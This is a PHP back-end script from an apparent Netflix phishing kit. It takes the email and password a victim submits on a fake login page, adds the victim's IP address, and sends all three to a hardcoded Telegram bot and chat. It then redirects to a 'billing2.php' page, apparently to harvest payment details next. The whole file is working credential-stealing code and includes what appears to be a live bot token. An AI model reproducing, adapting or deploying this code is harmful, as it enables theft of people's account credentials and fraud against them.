<?php
$ip = getenv("REMOTE_ADDR");


    $email = $_POST['mail'];
    $pass = $_POST['pass'];

        $tmsg = "---------- Netflix Login ---------\n\r";
        $tmsg .= "Email: $email \n";
        $tmsg .= "Password: $pass \n";
        $tmsg .= "IP VICTIME: $ip \n";
        $tmsg .= "--------------------------------------\n";
        
                    file_get_contents("https://api.telegram.org/bot5759111738:AAHsW7K_NhXMJOk89TYWrwooJYYCsu8k1Xo/sendMessage?chat_id=-924852898&text=" . urlencode($tmsg)."" );

 
        header("Location: ../billing2.php");
?>
